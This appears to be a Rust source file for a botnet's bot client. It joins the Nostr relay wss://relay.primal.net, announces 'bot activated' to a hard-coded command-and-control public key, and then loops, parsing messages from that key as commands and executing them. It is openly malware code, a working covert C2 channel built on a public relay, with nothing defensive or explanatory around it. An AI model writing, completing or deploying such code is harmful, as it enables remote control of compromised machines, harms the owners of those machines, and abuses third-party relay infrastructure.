use std::{
    net::{Ipv4Addr, SocketAddr, SocketAddrV4},
    time::Duration,
};

use bns_lib::{
    CNC_PUB_KEY,
    commands::Commands,
    session::{Session, SessionProps},
};
use nostr_sdk::prelude::*;

const RELAYS: [&str; 1] = ["wss://relay.primal.net"];

pub async fn run() -> Result<()> {
    let session = Session::create(SessionProps {
        name: "bot1".to_string(),
        display_name: "bot1".to_string(),
        private_key: None,
        relays: RELAYS.to_vec().iter().map(|&s| s.to_string()).collect(),
    })
    .await?;

    // announce bot presence
    session
        .send_msg("bot activated", PublicKey::parse(CNC_PUB_KEY).unwrap())
        .await?;

    let mut stream = session
        .subscribe(PublicKey::parse(CNC_PUB_KEY).unwrap())
        .await?;

    loop {
        tokio::select! {
            // What the hell men, new events are not received by subscription!?
            Some(event) = stream.next() => {
                println!("Got event {:?}", event.content);
                if let Some(command) = Commands::parse(event.content.as_str()) {
                    command.execute(&session).await?;
                }
            },
            _ = tokio::time::sleep(Duration::from_secs(10)) => {
                println!("Timeout reached, no events received");
            }
        }
    }
}

#[tokio::main]
async fn main() {
    match run().await {
        Err(e) => {
            println!("Got an error {}", e.to_string())
        }
        _ => println!("Succeeded"),
    }
}
